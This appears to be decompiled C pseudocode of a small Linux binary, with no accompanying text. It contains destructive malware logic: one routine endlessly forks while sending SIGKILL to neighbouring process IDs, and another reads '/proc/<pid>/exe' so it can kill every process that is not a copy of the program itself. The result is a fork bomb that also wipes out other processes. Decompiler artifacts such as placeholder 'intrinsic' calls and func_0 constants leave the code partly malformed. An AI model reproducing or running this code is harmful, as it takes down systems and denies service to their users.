int16_t sub_804853B(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {

	uint104_t v5;

	int32_t ebp6;

	int32_t eax7;

	int32_t ecx8;

	signed char* edi9;

	int32_t tmp32_10;

	struct s0* eax11;

	int32_t eax12;


	*(int32_t*)((int32_t)&v5 + 6) = ebp6;

	eax7 = kill(a1, func_0);

	if (!(int1_t)"intrinsic"()) {

		memset(0x804a086, func_0);

		sprintf(0x804a086, "%d", a1);

		ecx8 = -1;

		edi9 = (signed char*)0x804a080;

		tmp32_10 = 1 - 2 * (int32_t)func_0;

		do {

			if (!ecx8)

				break;

			--ecx8;

			edi9 = (signed char*)((int32_t)edi9 + tmp32_10);

		} while (!(int1_t)(*edi9 == func_0));

		eax11 = (struct s0*)(~ecx8 - 1 + 0x804a080);

		eax11->f0 = 0x6578652f;

		eax11->f4 = (signed char)func_0;

		eax12 = readlink(0x804a080, 0x804a280, 0xc8, *(int32_t*)((int32_t)&v5 + 9));

		if ((uint1_t)(eax12 == func_0) | (uint1_t)!(int1_t)("intrinsic"() == func_0))

			goto addr_0x8048601_6;

		eax12 = strcmp(0x804a180, 0x804a280, 0xc8);

		if (eax12 != func_0)

			goto addr_0x80485f1_8;

	} else {

		eax12 = -1;

	}

	addr_0x8048601_6:

	return *(int16_t*)&eax12;

	addr_0x80485f1_8:

	eax12 = kill(a1, 9);

	goto addr_0x8048601_6;

}

void sub_8048606() {

	int32_t eax1;

	int32_t v2;

	int32_t v3;

	int32_t v4;

	int32_t eax5;

	int32_t eax6;

	int32_t eax7;

	int32_t eax8;

	int32_t v9;

	int32_t eax10;

	int16_t ax11;

	int32_t eax12;

	int32_t v13;

	int32_t eax14;

	int32_t v15;

	int32_t eip16;

	int16_t ax17;

	int32_t eax18;

	int32_t v19;

	int32_t eax20;

	int32_t v21;

	int32_t eax22;

	int32_t v23;

	int32_t eip24;

	int32_t eax25;

	int32_t v26;


	eax1 = getpid();

	v2 = eax1;

	v3 = v2;

	v4 = (int32_t)func_0;

	while (v4 < 5) {

		++v2;

		if (v2 > 0x8000) {

			v2 = (int32_t)func_0;

		}

		eax5 = kill(v2, 9);

		eax6 = fork();

		if ((int1_t)(eax6 == func_0))

			goto addr_0x8048670_6;

		--v3;

		eax7 = kill(v3, 9);

		eax8 = fork();

		if ((int1_t)(eax8 == func_0))

			goto addr_0x80486a8_8;

		++v4;

	}

	addr_0x80486ce_10:

	eax10 = readlink("/proc/self/exe", 0x804a180, 0xc8, v9);

	g804a080 = 0x6f72702f;

	g804a084 = 0x2f63;

	g804a086 = (signed char)func_0;

	while (1) {

		++v2;

		if (v2 > 0x8000) {

			v2 = (int32_t)func_0;

		}

		ax11 = sub_804853B(v2, 0x804a180, 0xc8, v9);

		while (eax12 = fork(), v13 = eax12, v13 != -1) {

			if (!(int1_t)(v13 == func_0))

				continue;

			eax14 = getpid();

			v15 = eax14;

			v2 = v15;

			v3 = v15;

		}

		if (v3 > 0x5dc) {

			--v3;

			ax17 = sub_804853B(v3, 0x804a180, 0xc8, eip16);

		}

		while (eax18 = fork(), v19 = eax18, v19 != -1) {

			if (!(int1_t)(v19 == func_0))

				continue;

			eax20 = getpid();

			v21 = eax20;

			v2 = v21;

			v3 = v21;

		}

	}

	addr_0x8048670_6:

	eax22 = getpid();

	v23 = eax22;

	v2 = v23;

	v3 = v23;

	goto addr_0x80486ce_10;

	addr_0x80486a8_8:

	v9 = eip24;

	eax25 = getpid();

	v26 = eax25;

	v2 = v26;

	v3 = v26;

	goto addr_0x80486ce_10;

}

void sub_80487A0(int32_t a1, int32_t a2, int32_t a3) {

	int32_t edi4;

	int32_t ebx5;

	int32_t ebx6;

	int32_t ebp7;

	int32_t esi8;

	int32_t esi9;

	int32_t v10;

	int32_t v11;


	edi4 = (int32_t)func_0;

	sub_8048470();

	ebx5 = ebx6 + 0x1855;

	ebp7 = a1;

	init_proc();

	esi8 = ebx5 + 0xffffff0c - (ebx5 + 0xffffff08) >> 2;

	if (esi8 != func_0) {

		esi9 = esi8;

		do {

			*(int32_t*)(ebx5 + edi4 * 4 + 0xffffff08)(ebp7, v10, v11);

			++edi4;

		} while (edi4 != esi9);

	}

	return;

}